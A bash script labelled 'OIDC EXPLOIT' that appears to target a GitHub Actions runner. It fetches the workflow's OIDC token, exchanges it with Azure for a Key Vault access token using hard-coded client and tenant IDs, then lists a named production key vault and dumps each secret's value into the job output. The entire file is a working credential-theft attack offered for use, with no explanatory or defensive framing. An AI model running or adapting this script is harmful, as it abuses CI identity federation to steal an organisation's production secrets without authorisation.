#!/usr/bin/env bash
set +e
echo "=== OIDC EXPLOIT ==="
echo "REPO=$GITHUB_REPOSITORY EVENT=$GITHUB_EVENT_NAME"
echo "OIDC_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo SET || echo UNSET)"

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "No OIDC URL"
  exit 0
fi

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "JWT_LEN=${#JWT}"

if [ -z "$JWT" ]; then
  echo "No JWT"
  exit 0
fi

echo "CLAIMS:"
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"

RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  -d "client_id=$CID" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$JWT" \
  --data-urlencode "scope=https://vault.azure.net/.default")

AT=$(echo "$RESP" | jq -r '.access_token // empty')

if [ -n "$AT" ]; then
  echo "=== GOT TOKEN ==="
  echo "=== KEY VAULT SECRETS ==="
  curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $AT" | jq .
  for sid in $(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $AT" | jq -r '.value[]?.id // empty'); do
    echo "SECRET: $sid"
    curl -sS "${sid}?api-version=7.4" -H "Authorization: Bearer $AT" | jq .
  done
else
  echo "EXCHANGE FAILED:"
  echo "$RESP" | jq .
fi
